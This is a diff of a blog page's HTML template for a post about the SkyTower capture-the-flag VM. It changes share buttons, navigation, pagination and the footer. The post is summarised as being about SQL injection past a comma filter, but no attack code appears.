-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&is_video=false&description=Climbing%20the%20SkyTower" aria-label="Pinterest">
-      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=Climbing%20the%20SkyTower&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f" aria-label="Email">
-      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower" aria-label="Pocket">
-      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower" aria-label="reddit">
-      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&name=Climbing%20the%20SkyTower&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eRecently%2c%20at%20a%20local%20Security%20Conference%2c%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftelspacesystems%22%3e%40telspacesystems%3c%2fa%3e%20ran%20a%20CTF.%20It%20was%20a%20classic%20%26lsquo%3bread%20%2froot%2fflag.txt%26rsquo%3b%20CTF%20hosted%20on%20a%20wireless%20network.%20Sadly%20the%20wifi%20sucked%2c%20a%20lot%2c%20and%20due%20to%20this%20and%20a%20flat%20battery%20I%20was%20not%20able%20to%20attempt%20this%20CTF%20properly%20at%20the%20con.%20Nonetheless%2c%20the%20VM%20was%20released%20on%20%3ca%20href%3d%22http%3a%2f%2fvulnhub.com%2fentry%2fskytower-1%2c96%2f%22%3eVulnHub%3c%2fa%3e%2c%20and%20was%20promptly%20downloaded%20and%20loaded%20into%20VirtualBox.%3c%2fp%3e%0a%3cp%3eIn%20summary%2c%20this%20CTF%20taught%20me%20some%20interesting%20things%20about%20SQL%20injection%20where%20filters%20are%20present.%20More%20specifically%2c%20commas%20were%20filtered%20out%20and%20resulted%20in%20the%20need%20from%20some%20creative%20thinking%20%3a%29%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&t=Climbing%20the%20SkyTower" aria-label="Hacker News">
-      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      
-        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
-          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
-          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
-          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+</code></pre></div><p>Thanks to <a href=https://twitter.com/telspacesystems>@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
 </div>
-
-
-  <footer id="footer">
-  <div class="footer-left">
-    Copyright  &copy; 2021  Leon Jacobs 
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/>
+<span class=button__icon>←</span>
+<span class=button__text>Hell would just not freeze over!</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/>
+<span class=button__text>dnsfilexfer - yet another take on file transfer via DNS</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
 </footer>
-
-
-  </div>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
 </body>
-
-<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
-<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
-<script src=https://leonjza.github.io/js/main.js></script>
-<script src=https://leonjza.github.io/js/code-copy.js></script>
-
-
-
 </html>
